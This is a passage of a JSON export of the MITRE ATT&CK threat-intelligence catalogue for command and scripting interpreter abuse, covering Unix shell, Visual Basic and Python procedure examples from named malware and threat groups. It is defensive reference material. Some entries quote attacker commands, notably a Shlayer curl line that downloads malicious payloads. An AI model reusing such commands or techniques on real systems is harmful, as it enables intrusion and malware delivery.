                        "Description": "<name> can use cmd.exe to execute commands.[367]"
                    },
                    "S0206": {
                        "ID": "S0206",
                        "Name": "Wiarp",
                        "Description": "<name> creates a backdoor through which remote attackers can open a command line interface.[368]"
                    },
                    "G0102": {
                        "ID": "G0102",
                        "Name": "Wizard Spider",
                        "Description": "<name> has used cmd.exe to execute commands on a victim's machine.[369][370]"
                    },
                    "S1065": {
                        "ID": "S1065",
                        "Name": "Woody RAT",
                        "Description": "<name> can execute commands using cmd.exe.[371]"
                    },
                    "S0653": {
                        "ID": "S0653",
                        "Name": "xCaon",
                        "Description": "<name> has a command to start an interactive shell.[58]"
                    },
                    "S0117": {
                        "ID": "S0117",
                        "Name": "XTunnel",
                        "Description": "<name> has been used to execute remote commands.[372]"
                    },
                    "S0251": {
                        "ID": "S0251",
                        "Name": "Zebrocy",
                        "Description": "<name> uses cmd.exe to execute commands on the system.[373][374]"
                    },
                    "S0330": {
                        "ID": "S0330",
                        "Name": "Zeus Panda",
                        "Description": "<name> can launch an interface where it can execute several commands on the victim\u2019s PC.[375]"
                    },
                    "G0128": {
                        "ID": "G0128",
                        "Name": "ZIRCONIUM",
                        "Description": "<name> has used a tool to open a Windows Command Shell on a remote host.[376]"
                    },
                    "S0086": {
                        "ID": "S0086",
                        "Name": "ZLib",
                        "Description": "<name> has the ability to execute shell commands.[231]"
                    },
                    "S0350": {
                        "ID": "S0350",
                        "Name": "zwShell",
                        "Description": "<name> can launch command-line shells.[247]"
                    },
                    "S0412": {
                        "ID": "S0412",
                        "Name": "ZxShell",
                        "Description": "<name> can launch a reverse command shell.[26][377][378]"
                    }
                }
            },
            "004": {
                "name": "Unix Shell",
                "href": "/techniques/T1059/004",
                "description": "Adversaries may abuse Unix shell commands and scripts for execution. Unix shells are the primary command prompt on Linux and macOS systems, though many variations of the Unix shell exist (e.g. sh, bash, zsh, etc.) depending on the specific OS or distribution.[1][2] Unix shells can control every aspect of a system, with certain commands requiring elevated privileges.Unix shells also support scripts that enable sequential execution of commands as well as other typical programming operations such as conditionals and loops. Common uses of shell scripts include long or repetitive tasks, or the need to run the same set of commands on multiple systems.Adversaries may abuse Unix shells to execute various commands or payloads. Interactive shells may be accessed through command and control channels or during lateral movement such as with SSH. Adversaries may also leverage shell scripts to deliver and execute multiple commands on victims or as part of payloads used for persistence.",
                "Procedure": {
                    "S0504": {
                        "ID": "S0504",
                        "Name": "Anchor",
                        "Description": "<name> can execute payloads via shell scripting.[3]"
                    },
                    "S0584": {
                        "ID": "S0584",
                        "Name": "AppleJeus",
                        "Description": "<name> has used shell scripts to execute commands after installation and set persistence mechanisms.[4][5]"
                    },
                    "G0096": {
                        "ID": "G0096",
                        "Name": "APT41",
                        "Description": "<name> executed file /bin/pwd in activity exploiting CVE-2019-19781 against Citrix devices.[6]"
                    },
                    "S0482": {
                        "ID": "S0482",
                        "Name": "Bundlore",
                        "Description": "<name> has leveraged /bin/sh and /bin/bash to execute commands on the victim machine.[7]"
                    },
                    "S0077": {
                        "ID": "S0077",
                        "Name": "CallMe",
                        "Description": "<name> has the capability to create a reverse shell on victims.[8]"
                    },
                    "S0220": {
                        "ID": "S0220",
                        "Name": "Chaos",
                        "Description": "<name> provides a reverse shell connection on 8338/TCP, encrypted via AES.[9]"
                    },
                    "S1105": {
                        "ID": "S1105",
                        "Name": "COATHANGER",
                        "Description": "<name> provides a BusyBox reverse shell for command and control.[10]"
                    },
                    "S0369": {
                        "ID": "S0369",
                        "Name": "CoinTicker",
                        "Description": "<name> executes a bash script to establish a reverse shell.[11]"
                    },
                    "S0492": {
                        "ID": "S0492",
                        "Name": "CookieMiner",
                        "Description": "<name> has used a Unix shell script to run a series of commands targeting macOS.[12]"
                    },
                    "S0021": {
                        "ID": "S0021",
                        "Name": "Derusbi",
                        "Description": "<name> is capable of creating a remote Bash shell and executing commands.[13][14]"
                    },
                    "S0600": {
                        "ID": "S0600",
                        "Name": "Doki",
                        "Description": "<name> has executed shell scripts with /bin/sh.[15]"
                    },
                    "S0502": {
                        "ID": "S0502",
                        "Name": "Drovorub",
                        "Description": "<name> can execute arbitrary commands as root on a compromised system.[16]"
                    },
                    "S0401": {
                        "ID": "S0401",
                        "Name": "Exaramel for Linux",
                        "Description": "<name> has a command to execute a shell command on the system.[17][18]"
                    },
                    "S0410": {
                        "ID": "S0410",
                        "Name": "Fysbis",
                        "Description": "<name> has the ability to create and execute commands in a remote shell for CLI.[19]"
                    },
                    "S0690": {
                        "ID": "S0690",
                        "Name": "Green Lambert",
                        "Description": "<name> can use shell scripts for execution, such as /bin/sh -c.[20][21]"
                    },
                    "S0601": {
                        "ID": "S0601",
                        "Name": "Hildegard",
                        "Description": "<name> has used shell scripts for execution.[22]"
                    },
                    "S0265": {
                        "ID": "S0265",
                        "Name": "Kazuar",
                        "Description": "<name> uses /bin/bash to execute commands on the victim\u2019s machine.[23]"
                    },
                    "S0599": {
                        "ID": "S0599",
                        "Name": "Kinsing",
                        "Description": "<name> has used Unix shell scripts to execute commands in the victim environment.[24]"
                    },
                    "S0641": {
                        "ID": "S0641",
                        "Name": "Kobalos",
                        "Description": "<name> can spawn a new pseudo-terminal and execute arbitrary commands at the command prompt.[25]"
                    },
                    "S0451": {
                        "ID": "S0451",
                        "Name": "LoudMiner",
                        "Description": "<name> used shell scripts to launch various services and to start/stop the QEMU virtualization.[26]"
                    },
                    "S1016": {
                        "ID": "S1016",
                        "Name": "MacMa",
                        "Description": "<name> can execute supplied shell commands and uses bash scripts to perform additional actions.[27][28]"
                    },
                    "S0198": {
                        "ID": "S0198",
                        "Name": "NETWIRE",
                        "Description": "<name> has the ability to use /bin/bash and /bin/sh to execute commands.[29][30]"
                    },
                    "S1107": {
                        "ID": "S1107",
                        "Name": "NKAbuse",
                        "Description": "<name> is initially installed and executed through an initial shell script.[31]"
                    },
                    "S0402": {
                        "ID": "S0402",
                        "Name": "OSX/Shlayer",
                        "Description": "<name> can use bash scripts to check the macOS version, download payloads, and extract bytes from files. <name> uses the command sh -c tail -c +1381... to extract bytes at an offset from a specified file. <name> uses the curl -fsL \"$url\" >$tmp_path command to download malicious payloads into a temporary directory.[32][33][34][35]"
                    },
                    "S0352": {
                        "ID": "S0352",
                        "Name": "OSX_OCEANLOTUS.D",
                        "Description": "<name> uses a shell script as the main executable inside an app bundle and drops an embedded base64-encoded payload to the /tmp folder.[36][37]"
                    },
                    "S1109": {
                        "ID": "S1109",
                        "Name": "PACEMAKER",
                        "Description": "<name> can use a simple bash script for execution.[38]"
                    },
                    "S0587": {
                        "ID": "S0587",
                        "Name": "Penquin",
                        "Description": "<name> can execute remote commands using bash scripts.[39]"
                    },
                    "S1123": {
                        "ID": "S1123",
                        "Name": "PITSTOP",
                        "Description": "<name> has the ability to receive shell commands over a Unix domain socket.[40]"
                    },
                    "S0279": {
                        "ID": "S0279",
                        "Name": "Proton",
                        "Description": "<name> uses macOS' .command file type to script actions.[41]"
                    },
                    "S1108": {
                        "ID": "S1108",
                        "Name": "PULSECHECK",
                        "Description": "<name> can use Unix shell script for command execution.[38]"
                    },
                    "G0106": {
                        "ID": "G0106",
                        "Name": "Rocke",
                        "Description": "<name> used shell scripts to run commands which would obtain persistence and execute the cryptocurrency mining malware.[42]"
                    },
                    "S0468": {
                        "ID": "S0468",
                        "Name": "Skidmap",
                        "Description": "<name> has used pm.sh to download and install its main payload.[43]"
                    },
                    "G0139": {
                        "ID": "G0139",
                        "Name": "TeamTNT",
                        "Description": "<name> has used shell scripts for execution.[44][45]"
                    },
                    "S0647": {
                        "ID": "S0647",
                        "Name": "Turian",
                        "Description": "<name> has the ability to use /bin/sh to execute commands.[46]"
                    },
                    "S0466": {
                        "ID": "S0466",
                        "Name": "WindTail",
                        "Description": "<name> can use the open command to execute an application.[47]"
                    },
                    "S0658": {
                        "ID": "S0658",
                        "Name": "XCSSET",
                        "Description": "<name> uses a shell script to execute Mach-o files and osacompile commands such as, osacompile -x -o xcode.app main.applescript.[48]"
                    },
                    "S1114": {
                        "ID": "S1114",
                        "Name": "ZIPLINE",
                        "Description": "<name> can use /bin/sh to create a reverse shell and execute commands.[49]"
                    }
                }
            },
            "005": {
                "name": "Visual Basic",
                "href": "/techniques/T1059/005",
                "description": "Adversaries may abuse Visual Basic (VB) for execution. VB is a programming language created by Microsoft with interoperability with many Windows technologies such as Component Object Model and the Native API through the Windows API. Although tagged as legacy with no planned future evolutions, VB is integrated and supported in the .NET Framework and cross-platform .NET Core.[1][2]Derivative languages based on VB have also been created, such as Visual Basic for Applications (VBA) and VBScript. VBA is an event-driven programming language built into Microsoft Office, as well as several third-party applications.[3][4] VBA enables documents to contain macros used to automate the execution of tasks and other functionality on the host. VBScript is a default scripting language on Windows hosts and can also be used in place of JavaScript on HTML Application (HTA) webpages served to Internet Explorer (though most modern browsers do not come with VBScript support).[5]Adversaries may use VB payloads to execute malicious commands. Common malicious usage includes automating execution of behaviors with VBScript or embedding VBA content into Spearphishing Attachment payloads (which may also involve Mark-of-the-Web Bypass to enable execution).[6]",
                "Procedure": {
                    "C0028": {
                        "ID": "C0028",
                        "Name": "2015 Ukraine Electric Power Attack",
                        "Description": "During the <name>, Sandworm Team installed a VBA script called vba_macro.exe. This macro dropped FONTCACHE.DAT, the primary BlackEnergy implant; rundll32.exe, for executing the malware; NTUSER.log, an empty file; and desktop.ini, the default file used to determine folder displays on Windows machines. [7]"
                    },
                    "C0025": {
                        "ID": "C0025",
                        "Name": "2016 Ukraine Electric Power Attack",
                        "Description": "During the <name>, Sandworm Team created VBScripts to run on an SSH server.[8]"
                    },
                    "G0099": {
                        "ID": "G0099",
                        "Name": "APT-C-36",
                        "Description": "<name> has embedded a VBScript within a malicious Word document which is executed upon the document opening.[9]"
                    },
                    "G0050": {
                        "ID": "G0050",
                        "Name": "APT32",
                        "Description": "<name> has used macros, COM scriptlets, and VBS scripts.[10][11]"
                    },
                    "G0064": {
                        "ID": "G0064",
                        "Name": "APT33",
                        "Description": "<name> has used VBScript to initiate the delivery of payloads.[12]"
                    },
                    "G0067": {
                        "ID": "G0067",
                        "Name": "APT37",
                        "Description": "<name> executes shellcode and a VBA script to decode Base64 strings.[13]"
                    },
                    "G0082": {
                        "ID": "G0082",
                        "Name": "APT38",
                        "Description": "<name> has used VBScript to execute commands and other operational tasks.[14]"
                    },
                    "G0087": {
                        "ID": "G0087",
                        "Name": "APT39",
                        "Description": "<name> has utilized malicious VBS scripts in malware.[15]"
                    },
                    "S0373": {
                        "ID": "S0373",
                        "Name": "Astaroth",
                        "Description": "<name> has used malicious VBS e-mail attachments for execution.[16]"
                    },
                    "S0475": {
                        "ID": "S0475",
                        "Name": "BackConfig",
                        "Description": "<name> has used VBS to install its downloader component and malicious documents with VBA macro code.[17]"
                    },
                    "S0234": {
                        "ID": "S0234",
                        "Name": "Bandook",
                        "Description": "<name> has used malicious VBA code against the target system.[18]"
                    },
                    "S0268": {
                        "ID": "S0268",
                        "Name": "Bisonal",
                        "Description": "<name>'s dropper creates VBS scripts on the victim\u2019s machine.[19][20]"
                    },
                    "G0060": {
                        "ID": "G0060",
                        "Name": "BRONZE BUTLER",
                        "Description": "<name> has used VBS and VBE scripts for execution.[21][22]"
                    },
                    "S1039": {
                        "ID": "S1039",
                        "Name": "Bumblebee",
                        "Description": "<name> can create a Visual Basic script to enable persistence.[23][24]"
                    },
                    "C0011": {
                        "ID": "C0011",
                        "Name": "C0011",
                        "Description": "For <name>, Transparent Tribe used malicious VBA macros within a lure document as part of the Crimson malware installation process onto a compromised host.[25]"
                    },
                    "C0015": {
                        "ID": "C0015",
                        "Name": "C0015",
                        "Description": "During <name>, the threat actors used a malicious HTA file that contained a mix of HTML and JavaScript/VBScript code.[26]"
                    },
                    "S0631": {
                        "ID": "S0631",
                        "Name": "Chaes",
                        "Description": "<name> has used VBscript to execute malicious code.[27]"
                    },
                    "G0080": {
                        "ID": "G0080",
                        "Name": "Cobalt Group",
                        "Description": "<name> has sent Word OLE compound documents with malicious obfuscated VBA macros that will run upon user execution.[28][29][30][31][32][33]"
                    },
                    "S0154": {
                        "ID": "S0154",
                        "Name": "Cobalt Strike",
                        "Description": "<name> can use VBA to perform execution.[34][35][36]"
                    },
                    "S0244": {
                        "ID": "S0244",
                        "Name": "Comnie",
                        "Description": "<name> executes VBS scripts.[37]"
                    },
                    "G0142": {
                        "ID": "G0142",
                        "Name": "Confucius",
                        "Description": "<name> has used VBScript to execute malicious code.[38]"
                    },
                    "S1014": {
                        "ID": "S1014",
                        "Name": "DanBot",
                        "Description": "<name> can use a VBA macro embedded in an Excel file to drop the payload.[39]"
                    },
                    "S1111": {
                        "ID": "S1111",
                        "Name": "DarkGate",
                        "Description": "<name> initial infection mechanisms include masquerading as pirated media that launches malicious VBScript on the victim.[40]"
                    },
                    "S0695": {
                        "ID": "S0695",
                        "Name": "Donut",
                        "Description": "<name> can generate shellcode outputs that execute via VBScript.[41]"
                    },
                    "G1006": {
                        "ID": "G1006",
                        "Name": "Earth Lusca",
                        "Description": "<name> used VBA scripts.[42]"
                    },
                    "S0367": {
                        "ID": "S0367",
                        "Name": "Emotet",
                        "Description": "<name> has sent Microsoft Word documents with embedded macros that will invoke scripts to download additional payloads. [43][44][45][46][47]"
                    },
                    "S0343": {
                        "ID": "S0343",
                        "Name": "Exaramel for Windows",
                        "Description": "<name> has a command to execute VBS scripts on the victim\u2019s machine.[48]"
                    },
                    "S0679": {
                        "ID": "S0679",
                        "Name": "Ferocious",
                        "Description": "<name> has the ability to use Visual Basic scripts for execution.[49]"
                    },
                    "G1016": {
                        "ID": "G1016",
                        "Name": "FIN13",
                        "Description": "<name> has used VBS scripts for code execution on comrpomised machines.[50]"
                    },
                    "G0085": {
                        "ID": "G0085",
                        "Name": "FIN4",
                        "Description": "<name> has used VBA macros to display a dialog box and collect victim credentials.[51][52]"
                    },
                    "G0046": {
                        "ID": "G0046",
                        "Name": "FIN7",
                        "Description": "<name> used VBS scripts to help perform tasks on the victim's machine.[53][54][55]"
                    },
                    "S0696": {
                        "ID": "S0696",
                        "Name": "Flagpro",
                        "Description": "<name> can execute malicious VBA macros embedded in .xlsm files.[56]"
                    },
                    "C0001": {
                        "ID": "C0001",
                        "Name": "Frankenstein",
                        "Description": "During <name>, the threat actors used Word documents that prompted the victim to enable macros and run a Visual Basic script.[57]"
                    },
                    "C0007": {
                        "ID": "C0007",
                        "Name": "FunnyDream",
                        "Description": "During <name>, the threat actors used a Visual Basic script to run remote commands.[58]"
                    },
                    "G0047": {
                        "ID": "G0047",
                        "Name": "Gamaredon Group",
                        "Description": "<name> has embedded malicious macros in document templates, which executed VBScript. <name> has also delivered Microsoft Outlook VBA projects with embedded macros.[59][60][61][62][63]"
                    },
                    "S0477": {
                        "ID": "S0477",
                        "Name": "Goopy",
                        "Description": "<name> has the ability to use a Microsoft Outlook backdoor macro to communicate with its C2.[11]"
                    },
                    "G0078": {
                        "ID": "G0078",
                        "Name": "Gorgon Group",
                        "Description": "<name> has used macros in Spearphishing Attachments as well as executed VBScripts on victim machines.[64]"
                    },
                    "S0531": {
                        "ID": "S0531",
                        "Name": "Grandoreiro",
                        "Description": "<name> can use VBScript to execute malicious code.[16][65]"
                    },
                    "S0170": {
                        "ID": "S0170",
                        "Name": "Helminth",
                        "Description": "One version of <name> consists of VBScript scripts.[66]"
                    },
                    "G1001": {
                        "ID": "G1001",
                        "Name": "HEXANE",
                        "Description": "<name> has used a VisualBasic script named MicrosoftUpdator.vbs for execution of a PowerShell keylogger.[67]"
                    },
                    "G0126": {
                        "ID": "G0126",
                        "Name": "Higaisa",
                        "Description": "<name> has used VBScript code on the victim's machine.[68]"
                    },
                    "S0483": {
                        "ID": "S0483",
                        "Name": "IcedID",
                        "Description": "<name> has used obfuscated VBA string expressions.[69]"
                    },
                    "G0100": {
                        "ID": "G0100",
                        "Name": "Inception",
                        "Description": "<name> has used VBScript to execute malicious commands and payloads.[70][71]"
                    },
                    "S0528": {
                        "ID": "S0528",
                        "Name": "Javali",
                        "Description": "<name> has used embedded VBScript to download malicious payloads from C2.[16]"
                    },
                    "S0389": {
                        "ID": "S0389",
                        "Name": "JCry",
                        "Description": "<name> has used VBS scripts. [72]"
                    },
                    "S0283": {
                        "ID": "S0283",
                        "Name": "jRAT",
                        "Description": "<name> has been distributed as HTA files with VBScript.[73]"
                    },
                    "S0648": {
                        "ID": "S0648",
                        "Name": "JSS Loader",
                        "Description": "<name> can download and execute VBScript files.[55]"
                    },
                    "S0585": {
                        "ID": "S0585",
                        "Name": "Kerrdown",
                        "Description": "<name> can use a VBS base64 decoder function published by Motobit.[74]"
                    },
                    "S0387": {
                        "ID": "S0387",
                        "Name": "KeyBoy",
                        "Description": "<name> uses VBS scripts for installing files and performing execution.[75]"
                    },
                    "G0094": {
                        "ID": "G0094",
                        "Name": "Kimsuky",
                        "Description": "<name> has used Visual Basic to download malicious payloads.[76][77][78][79] <name> has also used malicious VBA macros within maldocs disguised as forms that trigger when a victim types any content into the lure.[79]"
                    },
                    "S0250": {
                        "ID": "S0250",
                        "Name": "Koadic",
                        "Description": "<name> performs most of its operations using Windows Script Host (VBScript) and runs arbitrary shellcode .[80]"
                    },
                    "S0669": {
                        "ID": "S0669",
                        "Name": "KOCTOPUS",
                        "Description": "<name> has used VBScript to call wscript to execute a PowerShell command.[81]"
                    },
                    "G0032": {
                        "ID": "G0032",
                        "Name": "Lazarus Group",
                        "Description": "<name> has used VBA and embedded macros in Word documents to execute malicious code.[82][83]"
                    },
                    "G0140": {
                        "ID": "G0140",
                        "Name": "LazyScripter",
                        "Description": "<name> has used VBScript to execute malicious code.[81]"
                    },
                    "G0065": {
                        "ID": "G0065",
                        "Name": "Leviathan",
                        "Description": "<name> has used VBScript.[84]"
                    },
                    "S0447": {
                        "ID": "S0447",
                        "Name": "Lokibot",
                        "Description": "<name> has used VBS scripts and XLS macros for execution.[85]"
                    },
                    "S0582": {
                        "ID": "S0582",
                        "Name": "LookBack",
                        "Description": "<name> has used VBA macros in Microsoft Word attachments to drop additional files to the host.[86]"
                    },
                    "G0095": {
                        "ID": "G0095",
                        "Name": "Machete",
                        "Description": "<name> has embedded malicious macros within spearphishing attachments to download additional files.[87]"
                    },
                    "G0059": {
                        "ID": "G0059",
                        "Name": "Magic Hound",
                        "Description": "<name> malware has used VBS scripts for execution.[88]"
                    },
                    "G1026": {
                        "ID": "G1026",
                        "Name": "Malteiro",
                        "Description": "<name> has utilized a dropper containing malicious VBS scripts.[89]"
                    },
                    "S0530": {
                        "ID": "S0530",
                        "Name": "Melcoz",
                        "Description": "<name> can use VBS scripts to execute malicious DLLs.[16]"
                    },
                    "S0455": {
                        "ID": "S0455",
                        "Name": "Metamorfo",
                        "Description": "<name> has used VBS code on victims\u2019 systems.[90]"
                    },
                    "S1122": {
                        "ID": "S1122",
                        "Name": "Mispadu",
                        "Description": "<name>\u2019s dropper uses VBS files to install payloads and perform execution.[89][91]"
                    },
                    "G0021": {
                        "ID": "G0021",
                        "Name": "Molerats",
                        "Description": "<name> used various implants, including those built with VBScript, on target machines.[92][93]"
                    },
                    "G0069": {
                        "ID": "G0069",
                        "Name": "MuddyWater",
                        "Description": "<name> has used VBScript files to execute its POWERSTATS payload, as well as macros.[94][95][96][97][98][99][100][101][102]"
                    },
                    "G0129": {
                        "ID": "G0129",
                        "Name": "Mustang Panda",
                        "Description": "<name> has embedded VBScript components in LNK files to download additional files and automate collection.[103][104][105]"
                    },
                    "S0228": {
                        "ID": "S0228",
                        "Name": "NanHaiShu",
                        "Description": "<name> executes additional VBScript code on the victim's machine.[106]"
                    },
                    "S0336": {
                        "ID": "S0336",
                        "Name": "NanoCore",
                        "Description": "<name> uses VBS files.[107]"
                    },
                    "S0198": {
                        "ID": "S0198",
                        "Name": "NETWIRE",
                        "Description": "<name> has been executed through use of VBScripts.[108][109]"
                    },
                    "G0049": {
                        "ID": "G0049",
                        "Name": "OilRig",
                        "Description": "<name> has used VBScript macros for execution on compromised hosts.[110]"
                    },
                    "S0264": {
                        "ID": "S0264",
                        "Name": "OopsIE",
                        "Description": "<name> creates and uses a VBScript as part of its persistent execution.[111][112]"
                    },
                    "C0012": {
                        "ID": "C0012",
                        "Name": "Operation CuckooBees",
                        "Description": "During <name>, the threat actors executed an encoded VBScript file using wscript and wrote the decoded output to a text file.[113]"
                    },
                    "C0022": {
                        "ID": "C0022",
                        "Name": "Operation Dream Job",
                        "Description": "During <name>, Lazarus Group executed a VBA written malicious macro after victims download malicious DOTM files; Lazarus Group also used Visual Basic macro code to extract a double Base64 encoded DLL implant.[114][115]"
                    },
                    "C0016": {
                        "ID": "C0016",
                        "Name": "Operation Dust Storm",
                        "Description": "During <name>, the threat actors used Visual Basic scripts.[116]"
                    },
                    "C0006": {
                        "ID": "C0006",
                        "Name": "Operation Honeybee",
                        "Description": "For <name>, the threat actors used a Visual Basic script embedded within a Word document to download an implant.[117]"
                    },
                    "C0013": {
                        "ID": "C0013",
                        "Name": "Operation Sharpshooter",
                        "Description": "During <name>, the threat actors used a VBA macro to execute a simple downloader that installed Rising Sun.[118]"
                    },
                    "C0014": {
                        "ID": "C0014",
                        "Name": "Operation Wocao",
                        "Description": "During <name>, threat actors used VBScript to conduct reconnaissance on targeted systems.[119]"
                    },
                    "S0352": {
                        "ID": "S0352",
                        "Name": "OSX_OCEANLOTUS.D",
                        "Description": "<name> uses Word macros for execution.[120]"
                    },
                    "G0040": {
                        "ID": "G0040",
                        "Name": "Patchwork",
                        "Description": "<name> used Visual Basic Scripts (VBS) on victim machines.[121][122]"
                    },
                    "S0428": {
                        "ID": "S0428",
                        "Name": "PoetRAT",
                        "Description": "<name> has used Word documents with VBScripts to execute malicious activities.[123][124]"
                    },
                    "S0441": {
                        "ID": "S0441",
                        "Name": "PowerShower",
                        "Description": "<name> has the ability to save and execute VBScript.[70]"
                    },
                    "S0223": {
                        "ID": "S0223",
                        "Name": "POWERSTATS",
                        "Description": "<name> can use VBScript (VBE) code for execution.[98][125]"
                    },
                    "S0147": {
                        "ID": "S0147",
                        "Name": "Pteranodon",
                        "Description": "<name> can use a malicious VBS file for execution.[126]"
                    },
                    "S0650": {
                        "ID": "S0650",
                        "Name": "QakBot",
                        "Description": "<name> can use VBS to download and execute malicious files.[127][128][129][130][131][132][133]"
                    },
                    "S0269": {
                        "ID": "S0269",
                        "Name": "QUADAGENT",
                        "Description": "<name> uses VBScripts.[134]"
                    },
                    "S0458": {
                        "ID": "S0458",
                        "Name": "Ramsay",
                        "Description": "<name> has included embedded Visual Basic scripts in malicious documents.[135][136]"
                    },
                    "G0075": {
                        "ID": "G0075",
                        "Name": "Rancor",
                        "Description": "<name> has used VBS scripts as well as embedded macros for execution.[137]"
                    },
                    "S0375": {
                        "ID": "S0375",
                        "Name": "Remexi",
                        "Description": "<name> uses AutoIt and VBS scripts throughout its execution process.[138]"
                    },
                    "S0496": {
                        "ID": "S0496",
                        "Name": "REvil",
                        "Description": "<name> has used obfuscated VBA macros for execution.[139][140]"
                    },
                    "S0240": {
                        "ID": "S0240",
                        "Name": "ROKRAT",
                        "Description": "<name> has used Visual Basic for execution.[141]"
                    },
                    "S1018": {
                        "ID": "S1018",
                        "Name": "Saint Bot",
                        "Description": "<name> has used .vbs scripts for execution.[142]"
                    },
                    "G0034": {
                        "ID": "G0034",
                        "Name": "Sandworm Team",
                        "Description": "<name> has created VBScripts to run an SSH server.[143][144][145][8]"
                    },
                    "S0589": {
                        "ID": "S0589",
                        "Name": "Sibot",
                        "Description": "<name> executes commands using VBScript.[146]"
                    },
                    "G1008": {
                        "ID": "G1008",
                        "Name": "SideCopy",
                        "Description": "<name> has sent Microsoft Office Publisher documents to victims that have embedded malicious macros that execute an hta file via calling mshta.exe.[147]"
                    },
                    "G0121": {
                        "ID": "G0121",
                        "Name": "Sidewinder",
                        "Description": "<name> has used VBScript to drop and execute malware loaders.[148]"
                    },
                    "G0091": {
                        "ID": "G0091",
                        "Name": "Silence",
                        "Description": "<name> has used VBS scripts.[149]"
                    },
                    "S0226": {
                        "ID": "S0226",
                        "Name": "Smoke Loader",
                        "Description": "<name> adds a Visual Basic script in the Startup folder to deploy the payload.[150]"
                    },
                    "S1086": {
                        "ID": "S1086",
                        "Name": "Snip3",
                        "Description": "<name> can use visual basic scripts for first-stage execution.[151][152]"
                    },
                    "C0024": {
                        "ID": "C0024",
                        "Name": "SolarWinds Compromise",
                        "Description": "For the <name>, APT29 wrote malware such as Sibot in Visual Basic.[153]"
                    },
                    "S1030": {
                        "ID": "S1030",
                        "Name": "Squirrelwaffle",
                        "Description": "<name> has used malicious VBA macros in Microsoft Word documents and Excel spreadsheets that execute an AutoOpen subroutine.[154][155]"
                    },
                    "S1037": {
                        "ID": "S1037",
                        "Name": "STARWHALE",
                        "Description": "<name> can use the VBScript function GetRef as part of its persistence mechanism.[156]"
                    },
                    "S0380": {
                        "ID": "S0380",
                        "Name": "StoneDrill",
                        "Description": "<name> has several VBS scripts used throughout the malware's lifecycle.[157]"
                    },
                    "S0559": {
                        "ID": "S0559",
                        "Name": "SUNBURST",
                        "Description": "<name> used VBScripts to initiate the execution of payloads.[158]"
                    },
                    "S1064": {
                        "ID": "S1064",
                        "Name": "SVCReady",
                        "Description": "<name> has used VBA macros to execute shellcode.[159]"
                    },
                    "G1018": {
                        "ID": "G1018",
                        "Name": "TA2541",
                        "Description": "<name> has used VBS files to execute or establish persistence for additional payloads, often using file names consistent with email themes or mimicking system functionality.[160][161]"
                    },
                    "G0062": {
                        "ID": "G0062",
                        "Name": "TA459",
                        "Description": "<name> has a VBScript for execution.[162]"
                    },
                    "G0092": {
                        "ID": "G0092",
                        "Name": "TA505",
                        "Description": "<name> has used VBS for code execution.[163][164][165][166]"
                    },
                    "G0134": {
                        "ID": "G0134",
                        "Name": "Transparent Tribe",
                        "Description": "<name> has crafted VBS-based malicious documents.[167][168]"
                    },
                    "G0010": {
                        "ID": "G0010",
                        "Name": "Turla",
                        "Description": "<name> has used VBS scripts throughout its operations.[169]"
                    },
                    "S0263": {
                        "ID": "S0263",
                        "Name": "TYPEFRAME",
                        "Description": "<name> has used a malicious Word document for delivery with VBA macros for execution.[170]"
                    },
                    "S0386": {
                        "ID": "S0386",
                        "Name": "Ursnif",
                        "Description": "<name> droppers have used VBA macros to download and execute the malware's full executable payload.[171]"
                    },
                    "S0442": {
                        "ID": "S0442",
                        "Name": "VBShower",
                        "Description": "<name> has the ability to execute VBScript files.[172]"
                    },
                    "S0689": {
                        "ID": "S0689",
                        "Name": "WhisperGate",
                        "Description": "<name> can use a Visual Basic script to exclude the C:\\ drive from Windows Defender.[173][174]"
                    },
                    "G0112": {
                        "ID": "G0112",
                        "Name": "Windshift",
                        "Description": "<name> has used Visual Basic 6 (VB6) payloads.[175]"
                    },
                    "G0090": {
                        "ID": "G0090",
                        "Name": "WIRTE",
                        "Description": "<name> has used VBScript  in its operations.[176]"
                    },
                    "S0341": {
                        "ID": "S0341",
                        "Name": "Xbash",
                        "Description": "<name> can execute malicious VBScript payloads on the victim\u2019s machine.[177]"
                    }
                }
            },
            "006": {
                "name": "Python",
                "href": "/techniques/T1059/006",
                "description": "Adversaries may abuse Python commands and scripts for execution. Python is a very popular scripting/programming language, with capabilities to perform many functions. Python can be executed interactively from the command-line (via the python.exe interpreter) or via scripts (.py) that can be written and distributed to different systems. Python code can also be compiled into binary executables.[1]Python comes with many built-in packages to interact with the underlying system, such as file operations and device I/O. Adversaries can use these libraries to download and execute commands or other scripts as well as perform various malicious behaviors.",
                "Procedure": {
                    "G0016": {
                        "ID": "G0016",
                        "Name": "APT29",
                        "Description": "<name> has developed malware variants written in Python.[2]"
                    },
                    "G0067": {
                        "ID": "G0067",
                        "Name": "APT37",
                        "Description": "<name> has used Python scripts to execute payloads.[3]"
                    },
                    "G0087": {
                        "ID": "G0087",
                        "Name": "APT39",
                        "Description": "<name> has used a command line utility and a network scanner written in python.[4][5]"
                    },
                    "S0234": {
                        "ID": "S0234",
                        "Name": "Bandook",
                        "Description": "<name> can support commands to execute Python-based payloads.[6]"
                    },
                    "G0060": {
                        "ID": "G0060",
                        "Name": "BRONZE BUTLER",
                        "Description": "<name> has made use of Python-based remote access tools.[7]"
                    },
                    "S0482": {
                        "ID": "S0482",
                        "Name": "Bundlore",
                        "Description": "<name> has used Python scripts to execute payloads.[8]"
                    },
                    "S0631": {
                        "ID": "S0631",
                        "Name": "Chaes",
                        "Description": "<name> has used Python scripts for execution and the installation of additional files.[9]"
                    },
                    "G1021": {
                        "ID": "G1021",
                        "Name": "Cinnamon Tempest",
                        "Description": "<name> has used a customized version of the Impacket wmiexec.py module to create renamed output files.[10]"
                    },
                    "S0154": {
                        "ID": "S0154",
                        "Name": "Cobalt Strike",
                        "Description": "<name> can use Python to perform execution.[11][12][13][14]"
                    },
                    "S0369": {
                        "ID": "S0369",
                        "Name": "CoinTicker",
                        "Description": "<name> executes a Python script to download its second stage.[15]"
                    },
                    "S0492": {
                        "ID": "S0492",
                        "Name": "CookieMiner",
                        "Description": "<name> has used python scripts on the user\u2019s system, as well as the Python variant of the Empire agent, EmPyre.[16]"
                    },
                    "C0029": {
                        "ID": "C0029",
                        "Name": "Cutting Edge",
                        "Description": "During <name>, threat actors used a Python reverse shell and the PySoxy SOCKS5 proxy tool.[17][18]"
                    },
                    "S0695": {
                        "ID": "S0695",
                        "Name": "Donut",
                        "Description": "<name> can generate shellcode outputs that execute via Python.[19]"
                    },
                    "G0035": {
                        "ID": "G0035",
                        "Name": "Dragonfly",
                        "Description": "<name> has used various types of scripting to perform operations, including Python scripts. The group was observed installing Python 2.7 on a victim.[20]"
                    },
                    "S0547": {
                        "ID": "S0547",
                        "Name": "DropBook",
